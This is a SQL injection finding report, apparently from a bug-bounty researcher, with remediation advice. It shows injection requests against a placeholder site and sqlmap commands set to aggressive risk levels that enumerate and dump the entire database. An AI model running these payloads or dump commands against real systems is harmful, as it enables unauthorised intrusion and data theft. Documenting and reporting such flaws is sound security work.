# 🐞 SQL Injection Detection & Exploitation Report

---

## 📌 Title

**Step-by-Step SQL Injection Discovery and Exploitation Using `'` and `'--+-`**

---

## 📝 Description

This SQL Injection vulnerability was discovered by using **incremental payloads**:

1. First injected a single quote `'` to break the SQL syntax.
2. Then used `'--+-` to comment out the remaining SQL and confirm control over the query.
3. After confirmation, `sqlmap` was used to enumerate and dump the database.

---

## 🧪 Step 1: Initial Detection with `'`

### 🔗 Test Request

```http
GET /product?id=1' HTTP/1.1
Host: vulnerable-website.com
```

### 🧪 Expected Behavior

- HTTP 500 Internal Server Error  
- SQL syntax error in the response like:

```html
SQL error near '1''
```

✅ **This suggests the input is being evaluated as part of an SQL query.**

---

## 🧪 Step 2: Confirm with `'--+-`

### 🔗 Follow-up Test Request

```http
GET /product?id=1'--+- HTTP/1.1
Host: vulnerable-website.com
```

### 🧪 Expected Behavior

- Page loads normally or skips certain logic
- No error shown (query successfully terminated and commented)
- Confirms injection and ability to modify query logic

✅ **This confirms a working SQL injection point.**

---

## 🧰 Step 3: Exploitation Using sqlmap

### 🔧 Basic sqlmap Command

```bash
sqlmap -u "https://vulnerable-website.com/product?id=1" --batch
```

### 🔧 Full Level + Risk (for aggressive testing)

```bash
sqlmap -u "https://vulnerable-website.com/product?id=1" --risk=3 --level=5 --batch --dbs
```

### 🔄 Dump All Tables

```bash
sqlmap -u "https://vulnerable-website.com/product?id=1" --risk=3 --level=5 --batch --dump-all
```

---

## ⚙️ Affected Component

- SQL query not using prepared statements
- Input not sanitized or validated
- Unsafely constructed queries using user-controlled input

---

## 🛡️ Recommended Remediation

- Use parameterized queries or ORM
- Validate and sanitize all user inputs
- Disable verbose SQL errors in production
- Apply principle of least privilege to DB accounts

---

## 🧾 References

- [OWASP SQLi](https://owasp.org/www-community/attacks/SQL_Injection)
- [sqlmap](https://github.com/sqlmapproject/sqlmap)

---

## 📅 Report Date

**2025-06-17**

---

## 🧑‍💻 Reported By

- **Security Researcher**: raghav  
- **Tools Used**: Manual Payloads (`'`, `'--+-`), sqlmap  
- **Severity**: Critical
